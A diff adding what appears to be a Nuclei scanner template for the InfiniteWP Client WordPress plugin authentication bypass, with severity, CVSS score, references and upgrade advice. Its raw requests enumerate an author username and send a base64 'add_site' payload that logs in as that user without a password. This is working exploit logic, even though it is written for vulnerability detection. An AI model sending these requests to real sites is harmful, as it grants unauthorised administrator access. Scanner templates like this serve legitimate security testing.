@@ -1,0 +1,68 @@
+id: wordpress-infinitewp-auth-bypass
+
+info:
+  name: WordPress InfiniteWP Client Authentication Bypass
+  author: princechaddha
+  severity: critical
+  description: InfiniteWP Client plugin versions 1.9.4.4 or earlier contain a critical authentication bypass vulnerability. InfiniteWP Client is a plugin that, when installed on a WordPress site, allows a site owner
+    to manage unlimited WordPress sites from their own server.
+  reference:
+    - https://www.wordfence.com/blog/2020/01/critical-authentication-bypass-vulnerability-in-infinitewp-client-plugin/
+    - https://wordpress.org/plugins/iwp-client/#developers
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  remediation: Upgrade to InfiniteWP Client 1.9.4.5 or higher.
+  tags: wordpress,auth-bypass,wp-plugin
+
+requests:
+  - raw:
+      - |
+        GET /?author=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Language: en-US,en;q=0.9
+
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Content-Type: application/x-www-form-urlencoded
+
+        _IWP_JSON_PREFIX_{{base64("{\"iwp_action\":\"add_site\",\"params\":{\"username\":\"{{username}}\"}}")}}
+
+    redirects: true
+    extractors:
+      - type: regex
+        name: username
+        internal: true
+        group: 1
+        part: body
+        regex:
+          - 'Author:(?:[A-Za-z0-9 -\_="]+)?<span(?:[A-Za-z0-9 -\_="]+)?>([A-Za-z0-9]+)<\/span>'
+
+      - type: regex
+        name: username
+        internal: true
+        group: 1
+        part: header
+        regex:
+          - 'ion: https:\/\/[a-z0-9.]+\/author\/([a-z]+)\/'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "wordpress_logged_in"
+        part: header
+
+      - type: word
+        words:
+          - "<IWPHEADER>"
+
+        part: body
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/03/21
